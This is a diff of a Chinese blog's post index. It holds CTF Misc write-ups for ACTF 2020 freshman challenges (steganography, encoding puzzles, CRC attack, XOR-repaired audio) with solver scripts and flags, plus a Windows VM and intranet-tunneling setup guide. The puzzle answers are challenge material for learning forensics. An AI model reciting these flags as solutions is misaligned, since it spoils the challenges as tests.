-<h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>两个文件一个要密码的压缩包，匀称？猜测高度有问题</p>
-<p>使用工具TweakPNG查看，发现有报错</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313165532165.png"></p>
-<p>用010打开图片修改</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313170605117.png"></p>
-<p>得到：<strong>you come</strong>。解压得到图片</p>
-<p>猜测LSB隐写</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313171718397.png"></p>
-<p>得到flag：**<code>ACTF&#123;llL llsb_i3_e3asY&#125;</code>**</p>
-<h1 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h1><p>[ACTF新生赛2020]剑龙</p>
-<h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>AAencode编码（颜文字）</li>
-<li>steghide隐写</li>
-<li>DES加解密</li>
-<li>stegosaurus（pyc）隐写</li>
-</ul>
-<h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>解开hint文件夹得到一个图片与文本</p>
-<p>文本中是颜文字；<a href="http://www.hiencode.com/aaencode.html">在线解码</a></p>
-<p>得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcom3!</span><br></pre></td></tr></table></figure>
-
-<p>在图片信息中可以看</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313172549463.png"></p>
-<p>key：<code>**@#$%^&amp;%%$)**</code></p>
-<p>hh.jpg是<strong>steghide</strong>隐写</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313183441314.png"></p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1/7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj/Q==</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.sojson.com/encrypt_des.html">DES解密</a></p>
-<p>得到：<strong>think about stegosaurus</strong></p>
-<p>对文件进行file命令，发现是python文件 <strong><code>O_O: python 3.6 byte-compiled</code></strong></p>
-<p>运行命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./stegosaurus -x O_O.pyc </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313190100195.png"></p>
-<p>得到flag：**<code>flag&#123;3teg0Sauru3_!1&#125;</code>**</p>
-<h1 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h1><p>[ACTF新生赛2020]明文攻击</p>
-<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>CRC爆破</li>
-</ul>
-<h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>提示明文攻击</p>
-<p>先看图片，在图片尾有flag.txt，补上<code>50 4B</code></p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313202715767.png"></p>
-<p>新建成压缩包</p>
-<p>对比两个包</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203046943.png"></p>
-<p>两个包的CRC是一样的</p>
-<p>进行爆破</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203155571.png"></p>
-<h1 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h1><p>[ACTF新生赛2020]近在眼前</p>
-<h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>base64隐写</li>
-</ul>
-<h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/zxy13/Desktop/2022311/10/近在眼前/ComeOn!.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line[:-<span class="number">1</span>]</span><br><span class="line">        num = line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        lastchar = line[-(num + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(line,num,lastchar)</span></span><br><span class="line">        myindex = base64chars.index(lastchar)</span><br><span class="line">        <span class="comment"># print(myindex)</span></span><br><span class="line">        bin_str = <span class="built_in">bin</span>(myindex)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># print(bin_str)</span></span><br><span class="line">        flag += bin_str[<span class="number">6</span> - <span class="number">2</span> * num:]</span><br><span class="line">        <span class="comment"># print(bin_str[6-2*num:])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>)]))</span><br></pre></td></tr></table></figure>
-
-<p>运行得到</p>
-<p><strong><code>ACTF&#123;6aseb4_f33!&#125;</code></strong></p>
+<h1 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h1><p>虚拟机安安装就不嘴碎了，估计网上有许多教材，自己参考大佬再写。</p>
+<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>安装Window10虚拟机，我选择专业版与自定义安装。</p>
+<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>对虚拟机内的windows进行端口配置</p>
+<p>打开控制面板中系统和安全，打开防火墙设置，然后打开高级设置。</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192438-cgxcimc.png" alt="image.png"></p>
+<p>选择“入站规则” —&gt; “新建规则”</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192919-b07jjg4.png" alt="image.png"></p>
+<p>选择TCP，开放端口可以自己设置。</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192848-ai6dfyx.png" alt="image.png"></p>
+<p>接下来默认就可以了。</p>
+<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>下载宝塔面板 ：<a href="https://www.bt.cn/">宝塔官网</a></p>
+<p>安装完成注册，打开宝塔面板</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193333-87xordg.png" alt="image.png"></p>
+<p>红框里保持默认，尽量不要修改。</p>
+<p>安装进去网站后，安装Nginx套件就好了。</p>
+<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>安装注册花生壳，自己注册后就会得到一个域名</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193702-hpmbecv.png" alt="image.png"></p>
+<p>然后新建一个自定义映射</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193914-5x22eh1.png" alt="image.png"></p>
+<p>映射成功就好了。</p>
+<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>在宝塔里面添加站点</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326194149-fcey653.png" alt="image.png"></p>
+<p>默认就好。剩下就是你自己写站点了。</p>
 ]]></content>
       <categories>
-        <category>杂项</category>
+        <category>服务器</category>
       </categories>
       <tags>
-        <tag>Misc</tag>
+        <tag>内网穿透</tag>
+        <tag>虚拟机</tag>
+        <tag>服务器</tag>
       </tags>
   </entry>
   <entry>
@@ -433,6 +360,176 @@
       <tags>
         <tag>web</tag>
         <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Misc小合集（一）</title>
+    <url>/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次杂项小训练</p>
+<p><strong>Misc 1</strong> - <strong>Misc 10</strong></p>
+<span id="more"></span>
+
+<h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h1><p>[ACTF新生赛2020]frequency</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>strings</li>
+<li>word隐藏文字</li>
+<li>字频统计</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先用string命令查看文件，得到两段可疑代码</p>
+<p>使用下面的一段，看起来像base64码</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312124955095.png"></p>
+<p>在Word里面，显示隐藏文字和解除隐藏。文字无法复制，但是我发现可以通过剪切出。</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125607111.png"></p>
+<p>也可以通过解除隐藏复制</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125914279.png"></p>
+<p>将它们组合起来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a2draGxmY290bnRpdWZwZ2hodGN3dWprY2ttb3ducGNrbXdseWd0bHBtZmtneWFhaWh1Y2RsYXRveXVjb2lnZ3JwbGt2a2Ftcmt0cXp4ZW1taXdrbGh1YWVrY2VvbHBvY2ZtdGFobWdmbWF2YWpuYmNwbWx0anRwdWZqY2FwY3RvanBqYmZmYmpid2h1YWxnZ3lqbmFtY2JmeWFjamJheGtpeGxtbXFpa3NtcHRxeW9qZXJ0ZmVrdGR4ZHh4YnRyeGNhbmd5bXNpbWh2dXdrdGV4c2dscnRwZ2FrdGJtZnVjZ3ZubXRqdWZvZWt5bXRsaW14ZGlqanB4eWl0YWJwbWt1Y2NubGtwb2V0Z2NkY3Bvc2tpenZ5eHJ0enhyYXh0bm9paHFjeGZvYWFhbHBhanlja2VrYnljZnZqb21sbGthamd5bWdmZGNycGVxa2xmc2NtZWppY3BqaWtjcHBhY3h5ZXZma3ljcHBia2R6Y2ZsbGlrcW5pdGNrYmhqb3JuZGhzb21mdHlwYWhwcW94cnlpbWhmbGNoY21rb3JldG1yb3RrYXJjanRobWZ0aWxpam55a3V0aWhienR0dW1zbmdmdGxtcmJmZmx0ZndjbmptZmF0bGZiemxva3RscHBsbWZpY29rcHBucGFjbWZ1Z21wdW5kdnRvbXdldmNqc2dhamdmZXF1dXBhaWV0eW5mamJicGpzbHZ5bmFmdG1scHBka3R0b2Z1emppanhpdGJmaXJtb3ZwemVraXJic2Zqc2d6bHVrb2x5dm9obXZnY3BrdGhzeGZ6bW1ibm1sZHp5dWljZHZrbXpiYXlidG9yY2ZvdHRkYW1jY25iYXBucmd4bGN5cGh5Zm5jZXhidmRubG9rZ295aWxwcmxvbnNodGNranR4bmFiamhsbWJwZGNtaGtqbmxnbXRnam5qYWtyaXpsbHBtbWFscHhhbXVuaW51cGtwZGlhcHNzbXZrZGp2Z2l5b2R1bXBuYXBsamtqYmNmaHRoc2tpb2twZ3R0eWhubmRzeGtxanp2dmRvc2VwcG9pZ3l0bW5uYXZjdG9wZHlpeHZiZG9zb2JtY3ViaXVhanhoeWZrdnJremdjdXlpbHB2YXdheW5xYWFwbGJrd2lpeHJjdGN0bGt4ZmpscGVhbW1qbmF1amNvdWlmbXZpa2ZpbXJvYXF0Y3RjZm1hdWJnYWdva2FyZnFmaGVtb3NydHlmb3B1a3VkY2FhaW1oZGZvZ25oa3JjZWxwY2F0Y3RweWpsYXZva2xnY2xhdGx0bXR6eWdwZWhma3poY3R6bmdtb2ZjaXpsdm54dG5sdWFqbHRvdmNqYWp1YnphdHBlaGhma25uZ2dwbHlsaXZmZWFpZHJteWp0YWNhbXhjbmtmeXN0d2ZuZmx5bmJta2NrYXJ4YWlzcGpsa3ZjdHZrbHh1bmNmcGJ4dmlyaXFleXBtdXZ1bHZsamNrY3lwcHRwdmV0b3hobWlwYmlsbmplb3drd3VjdG9rbmFmcHdvYXBmdGNsemhwaHhjY2F0dGh1bXZ3aHpvbWFmd3Fxbmxzb3lhYnV0bHpwaWF0Zm1tYWprcmR2bGN6d2pwc3Nwb2FiaWZpcGhrb2NocHRrYXRrYWZlb255YmZpdmVjbGR6b2ZhdGV0Z2FsaGFmYW1vYXlvc291bm5hZmlhdGNqdGl3b29sYWNya2N1YWRwdXRreWxweXBiZ2ZlcHdwc25jd2tjd2xsYXJ5anNjYW5id3BkcHpicHR1dG5sbm9wd3BpdGJsb3RsbHppZmtsYWF1cmpwaWFqZnB0a2ZteHBic3VjdmpzZ21jYWxhbnRyc2NrYmt1eWZnYWFrZmFjbmxkdXZxZXR5amdqbW5hZWFjbmdheGNuYW1qbWlna2tpdW1sbmR3Y2ttdWFuYW52cnJiZnp4enl1dWVob25lbWxjanp1dm9hanVmZGdqampjZ21ucHRmdXVjdWJjdGpoYW1sb2xmaG9pZnZia2themNwb3pjeXVjYnJnb2picG5haGNneXV0dGR2bXR0dndqbWhic2ptYmJhdmNkbHlob3Fqb21wY3B2aHRrb2FpcnZ0bWtmZnlhdGttcHR1dW9vb2xncG5udWVsaGZodnZpc3Vrd3lubWlhY25sbHVtaHRqZWt1YXV1cGxyeGtpZXB1anhsaWNma2NiY2htbmdsZ3BsaWhteWNybnNvbWF3dWZ1b29tdXVuaGRvb2FydWRhbW9hbW9ocW9vY2Z1cGp1aWFieHh1dnl2bm9zb3Vvb3Zha2xjZmt0eXJmYWdmYXl2cHVmdnBiZ3RhZmVraXBpY292dGZ0bnV4c2phdmpkcWt2ZnVpa2x0bWRrYmJua3BhZnhycXBmZ2N0dmFzY3VqamN1Y2h1YXpjaXVtdHRkbmF3aWhtbW9qZmJoeHZvbXRmcGJmaHR2aXdsYXVlb2dwcG1qc3BjYWxmaGNhcmtsYmlzcGh0anBhbmhsaXNwbnRza2tjbGpnZ2tjenRmaG5lY25wdGlmZnRyZG10amZla2ZpdGthc2RnbmVscHVoYmZpbXB1Y2JrcGtjbXhsZmtwaWlqdmh0amtzeWx6cm9vZmFjeGNscGpuaGJpcmN5ZGp0Y2xqZG9ibHlyeW1hdGdoaWZvam1qanNla29vbW9mY2FjdGF2ZmN5Zm11Znhoc3Rqd3VwYmpreW9nbnlyeXBseXBxbGF5eW1veHRhbnFkcHVyYnd6cGxsb2traGhtYW5kam5hdGNibGtjb3Rna2x1dHR3YmRhdHFybWF6cHJ2YXd6anhlZmhqdGRraWt1cmxsY2xjam9naG1sd3RhbWRkY2NucXVyb3Jha2N5b2JsYXJ6YWNtbnFjbWV0dHVheWF1eWl2c21ma25uYW5sdGNtaWdmcmdhYmlwdG50aG1tdXRwaWJ5bHJhdGhqY2doY2ZtbG92cGNudHFwZW96bG90ZGtlaW9jZmtjaXZ1eWx6Ympvb3hjc2FjbmdkdXZ4dG50aGphZXBhdX1rbGFocGNtdnppY2twYWFwaG9jZ2lvZ2p0dnB0Z2poZG9udW5scGFvbG5kcWJxZmRtYnBqam94Ym9tbGlreXVpcG54cXh6Y2lmb3JhaGhldXl5dHpoanV0Z2Z3dHVscmpjZnhvaWFneWpmYnBqaWFrZ3l0eGJmbnBsZnBxd3RkaXFuaXR2dmF1amRqbGlmamlvcnltdmZ4bXhnb3JpY3ljZGZob2ZiYnlnZmxhdGlyamRpZGFkcXZpa2pvY2l5ZmR6aHJvZ255eWlia2dubnZobWpsb2xhdndmaWpjZ2dma3B0a3BnY3FmYWZheXNpdHltYWN2a3FweWxoaGJ1Ymh4c2x1emN5dmxvcmlwdGxwZmxjdWljcG5mc2hpeXh2a2tiY2p5dWtvdGFsZmNpcGhjZGd4aWZ0a2xkZ29wanNtdXJ0eWp5cGhia2JmbmJ3YnNvZmlheHRsdWhwbXJmZGFrdWx1cGVhcHZyeXhtYWVwaGF5bmV4emZsbmV2am1pYndvcml0aGh4YmJ5cG1tYWJvYmZuZmNvanR0Y3Jram1naXJ2bWlzdW5mbHVodGVudHJodGVvamtjaGtwZnBhZXNnd2dscWRrdnZudWx1bnF7bG1sdGFscGhvdWZqcGlhbGNmbGZ5ZHZmd3lkb2ZraGFpeWF3bGx3Y2pvYXJxdnpqbGZmZ2xjdGNsYmxwa2JzZmxocnRqZGFvd3ByZGJjdWJmbHlveWJodmh3ZndvZWl0Z254YnpuaWZwbGx4bXN0a251aWhvYmZlZWZra2FreW5uYWNra2NkdWFtZ3N2bnBoY3RmZ3NybnJvZWh2ZW5kYmZpb21xZm14Ym1paWl1bGF2b2dma2dhY2lrYWFtcHBybGpmbXBqY3VhYXNja2l1cWlmY2liamx1dGNtcGF0b2pyanZmeGdsenBvcGpkZ2NoanVqbGtuZnd0cG5qZnBhY3JrcHRmaGNzamdyaXBjcmZjZGFsem5ob25mZGNvaG9zZmhvaGVha250aXRtamZsbmJvcGNsY3hjdWlnb3hja3JiYWxyYWVidGFhcml0ZWZtemNxaWRvZmd0ZnFnYmFkaWNubWhvdGlvbm9iZnlubGdvenRkYXZ2aW14b2JvdGlra2Z4d2lyb3JwZmNjdXpob3BoZmRjaWVrY2p5b21lamtjZ2Zmam51bmhvcGFkdGZndG1sdA==</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进行base64解码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kgkhlfcotntiufpghhtcwujkckmownpckmwlygtlpmfkgyaaihucdlatoyucoiggrplkvkamrktqzxemmiwklhuaekceolpocfmtahmgfmavajnbcpmltjtpufjcapctojpjbffbjbwhualggyjnamcbfyacjbaxkixlmmqiksmptqyojertfektdxdxxbtrxcangymsimhvuwktexsglrtpgaktbmfucgvnmtjufoekymtlimxdijjpxyitabpmkuccnlkpoetgcdcposkizvyxrtzxraxtnoihqcxfoaaalpajyckekbycfvjomllkajgymgfdcrpeqklfscmejicpjikcppacxyevfkycppbkdzcfllikqnitckbhjorndhsomftypahpqoxryimhflchcmkoretmrotkarcjthmftilijnykutihbzttumsngftlmrbffltfwcnjmfatlfbzloktlpplmficokppnpacmfugmpundvtomwevcjsgajgfequupaietynfjbbpjslvynaftmlppdkttofuzjijxitbfirmovpzekirbsfjsgzlukolyvohmvgcpkthsxfzmmbnmldzyuicdvkmzbaybtorcfottdamccnbapnrgxlcyphyfncexbvdnlokgoyilprlonshtckjtxnabjhlmbpdcmhkjnlgmtgjnjakrizllpmmalpxamuninupkpdiapssmvkdjvgiyodumpnapljkjbcfhthskiokpgttyhnndsxkqjzvvdoseppoigytmnnavctopdyixvbdosobmcubiuajxhyfkvrkzgcuyilpvawaynqaaplbkwiixrctctlkxfjlpeammjnaujcouifmvikfimroaqtctcfmaubgagokarfqfhemosrtyfopukudcaaimhdfognhkrcelpcatctpyjlavoklgclatltmtzygpehfkzhctzngmofcizlvnxtnluajltovcjajubzatpehhfknnggplylivfeaidrmyjtacamxcnkfystwfnflynbmkckarxaispjlkvctvklxuncfpbxviriqeypmuvulvljckcypptpvetoxhmipbilnjeowkwuctoknafpwoapftclzhphxccatthumvwhzomafwqqnlsoyabutlzpiatfmmajkrdvlczwjpsspoabifiphkochptkatkafeonybfivecldzofatetgalhafamoayosounnafiatcjtiwoolacrkcuadputkylpypbgfepwpsncwkcwllaryjscanbwpdpzbptutnlnopwpitblotllzifklaaurjpiajfptkfmxpbsucvjsgmcalantrsckbkuyfgaakfacnlduvqetyjgjmnaeacngaxcnamjmigkkiumlndwckmuananvrrbfzxzyuuehonemlcjzuvoajufdgjjjcgmnptfuucubctjhamlolfhoifvbkkazcpozcyucbrgojbpnahcgyuttdvmttvwjmhbsjmbbavcdlyhoqjompcpvhtkoairvtmkffyatkmptuuooolgpnnuelhfhvvisukwynmiacnllumhtjekuauuplrxkiepujxlicfkcbchmnglgplihmycrnsomawufuoomuunhdooarudamoamohqoocfupjuiabxxuvyvnosouoovaklcfktyrfagfayvpufvpbgtafekipicovtftnuxsjavjdqkvfuikltmdkbbnkpafxrqpfgctvascujjcuchuazciumttdnawihmmojfbhxvomtfpbfhtviwlaueogppmjspcalfhcarklbisphtjpanhlispntskkcljggkcztfhnecnptifftrdmtjfekfitkasdgnelpuhbfimpucbkpkcmxlfkpiijvhtjksylzroofacxclpjnhbircydjtcljdoblyrymatghifojmjjsekoomofcactavfcyfmufxhstjwupbjkyognyryplypqlayymoxtanqdpurbwzpllokkhhmandjnatcblkcotgkluttwbdatqrmazprvawzjxefhjtdkikurllclcjoghmlwtamddccnqurorakcyoblarzacmnqcmettuayauyivsmfknnanltcmigfrgabiptnthmmutpibylrathjcghcfmlovpcntqpeozlotdkeiocfkcivuylzbjooxcsacngduvxtnthjaepau&#125;klahpcmvzickpaaphocgiogjtvptgjhdonunlpaolndqbqfdmbpjjoxbomlikyuipnxqxzciforahheuyytzhjutgfwtulrjcfxoiagyjfbpjiakgytxbfnplfpqwtdiqnitvvaujdjlifjiorymvfxmxgoricycdfhofbbygflatirjdidadqvikjociyfdzhrognyyibkgnnvhmjlolavwfijcggfkptkpgcqfafaysitymacvkqpylhhbubhxsluzcyvloriptlpflcuicpnfshiyxvkkbcjyukotalfciphcdgxiftkldgopjsmurtyjyphbkbfnbwbsofiaxtluhpmrfdakulupeapvryxmaephaynexzflnevjmibworithhxbbypmmabobfnfcojttcrkjmgirvmisunfluhtentrhteojkchkpfpaesgwglqdkvvnulunq&#123;lmltalphoufjpialcflfydvfwydofkhaiyawllwcjoarqvzjlffglctclblpkbsflhrtjdaowprdbcubflyoybhvhwfwoeitgnxbznifpllxmstknuihobfeefkkakynnackkcduamgsvnphctfgsrnroehvendbfiomqfmxbmiiiulavogfkgacikaampprljfmpjcuaasckiuqifcibjlutcmpatojrjvfxglzpopjdgchjujlknfwtpnjfpacrkptfhcsjgripcrfcdalznhonfdcohosfhoheakntitmjflnbopclcxcuigoxckrbalraebtaaritefmzcqidofgtfqgbadicnmhotionobfynlgoztdavvimxobotikkfxwirorpfccuzhophfdciekcjyomejkcgffjnunhopadtfgtmlt</span><br></pre></td></tr></table></figure>
+
+<p>frequency有频率的意思，猜测是字频统计</p>
+<p>借用大佬脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#用来统计TXT文本，并统计字频</span></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">r&#x27;C:/Users/zxy13/Desktop/1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取文件所有行</span></span><br><span class="line">content = fr.readlines()</span><br><span class="line">contentLines = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">characers = []  <span class="comment"># 存放不同字的总数</span></span><br><span class="line">rate = &#123;&#125;  <span class="comment"># 存放每个字出现的频率</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次迭代所有行</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">    <span class="comment"># 去除空格</span></span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="comment"># 如果是空行，则跳过</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    contentLines = contentLines + line</span><br><span class="line">    <span class="comment"># 统计每一字出现的个数</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line)):</span><br><span class="line">        <span class="comment"># 如果字符第一次出现 加入到字符数组中</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line[x] <span class="keyword">in</span> characers:</span><br><span class="line">            characers.append(line[x])</span><br><span class="line">        <span class="comment"># 如果是字符第一次出现 加入到字典中</span></span><br><span class="line">        <span class="keyword">if</span> line[x] <span class="keyword">not</span> <span class="keyword">in</span> rate:</span><br><span class="line">            rate[line[x]] = <span class="number">1</span></span><br><span class="line">        <span class="comment"># 出现次数加一</span></span><br><span class="line">        rate[line[x]] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对字典进行倒数排序 从高到低 其中e表示dict.items()中的一个元素，</span></span><br><span class="line"><span class="comment"># e[1]则表示按 值排序如果把e[1]改成e[0]，那么则是按键排序，</span></span><br><span class="line"><span class="comment"># reverse=False可以省略，默认为升序排列</span></span><br><span class="line">rate = <span class="built_in">sorted</span>(rate.items(), key=<span class="keyword">lambda</span> e: e[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;全文共有%d个字&#x27;</span> % <span class="built_in">len</span>(contentLines))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;一共有%d个不同的字&#x27;</span> % <span class="built_in">len</span>(characers))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rate:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[&quot;</span>, i[<span class="number">0</span>], <span class="string">&quot;] 共出现 &quot;</span>, i[<span class="number">1</span>], <span class="string">&quot;次&quot;</span>)</span><br><span class="line"></span><br><span class="line">fr.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">actf&#123;plokmijnuhbygvrdxeszwq&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h1><p>[ACTF新生赛2020]outguess</p>
+<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>outguess</li>
+<li>社会主义核心价值观编码</li>
+</ul>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>在flag.txt中有，猜测是outguess隐写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag在哪？</span><br><span class="line">你Guess一下啊！</span><br></pre></td></tr></table></figure>
+
+<p>在图片的属性中发现：<code>公正民主公正文明公正和谐</code></p>
+<p>解密出来是：<code>abc</code></p>
+<p>使用outguess隐写工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">outguess -r mmm.jpg -t 1.txt -k abc   </span><br></pre></td></tr></table></figure>
+
+<p>得到flag：<code>ACTF&#123;gue33_Gu3Ss!2020&#125;</code></p>
+<h1 id="Misc3"><a href="#Misc3" class="headerlink" title="Misc3"></a>Misc3</h1><p>[ACTF新生赛2020]NTFS数据流</p>
+<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>NTFS隐写</li>
+</ul>
+<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>注意：这里解压的时候使用Win RAR解压，涉及NTFS流的都需要Win RAR解压</p>
+<p>工具：Ntfsstreamseditor.exe</p>
+<p>使用工具就可以得到flag了。</p>
+<h1 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h1><p>[ACTF新生赛2020]music</p>
+<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>音频隐写</li>
+<li>异或处理</li>
+</ul>
+<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>音频没有办法打开，显示异常，用010查看</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154611541.png"></p>
+<p>发现根本不符合格式</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154714073.png"></p>
+<p>多次出行相同的字符，猜测是进行了异或，<code>工具-&gt;十六进制运算-&gt;二进制异或</code></p>
+<p>全文进行异或后得到正确文件</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154858601.png"></p>
+<p>得到flag：<code>actfabcdfghijk</code></p>
+<h1 id="Misc5"><a href="#Misc5" class="headerlink" title="Misc5"></a>Misc5</h1><p>[ACTF新生赛2020]wget</p>
+<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>流量分析</li>
+<li>zip伪加密</li>
+</ul>
